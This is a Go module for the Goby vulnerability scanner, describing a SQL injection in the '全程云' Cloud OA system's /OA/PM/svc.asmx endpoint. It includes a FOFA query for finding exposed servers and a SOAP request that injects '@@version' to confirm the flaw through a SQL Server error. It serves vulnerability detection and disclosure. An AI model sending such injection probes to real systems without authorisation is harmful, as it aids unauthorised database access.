package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Cloud OA System/OA/PM/svc.asmx sqli",
    "Description": "<p>cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database. </p>",
    "Impact": "Cloud OA System/OA/PM/svc.asmx sqli",
    "Recommendation": "<p>1. Use prepared statements. </p><p>2. Escape the special characters that enter the database. </p>",
    "Product": "Cloud OA system",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "全程云oa办公系统/OA/PM/svc.asmx SQL注入漏洞",
            "Description": "<p>全程云oa办公系统/OA/PM/svc.asmx页面参数过滤不当，导致存在sql注入漏洞，可利用该漏洞获取数据库中的敏感信息。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">/OA/PM/svc.asmx页面参数过滤不当，导致存在sql注入漏洞，可利用该漏洞获取数据库中的敏感信息。</span><br></p>",
            "Recommendation": "<p>1、使用预编译语句。</p><p>2、对进入数据库的特殊字符进行转义处理。</p>",
            "Product": "全程云oa办公系统",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Cloud OA System/OA/PM/svc.asmx sqli",
            "Description": "<p>cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database. <br></p>",
            "Impact": "Cloud OA System/OA/PM/svc.asmx sqli",
            "Recommendation": "<p>1. Use prepared statements. </p><p>2. Escape the special characters that enter the database. </p>",
            "Product": "Cloud OA system",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"全程云办公\" && body=\"/OA/WebResource.axd\"",
    "GobyQuery": "body=\"全程云办公\" && body=\"/OA/WebResource.axd\"",
    "Author": "learnupup@gmail.com",
    "Homepage": "https://oa.24om.com/",
    "DisclosureDate": "2021-12-03",
    "References": [
        "https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=3860"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OA/PM/svc.asmx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetUsersInfo xmlns=\"http://tempuri.org/\">\n      <userIdList>@@version</userIdList>\n    </GetUsersInfo>\n  </soap:Body>\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Microsoft SQL Server",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "转换成数据类型 int 时失败",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OA/PM/svc.asmx",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "text/xml"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetUsersInfo xmlns=\"http://tempuri.org/\">\n      <userIdList>@@version</userIdList>\n    </GetUsersInfo>\n  </soap:Body>\n</soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Microsoft SQL Server",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "转换成数据类型 int 时失败",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10253"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
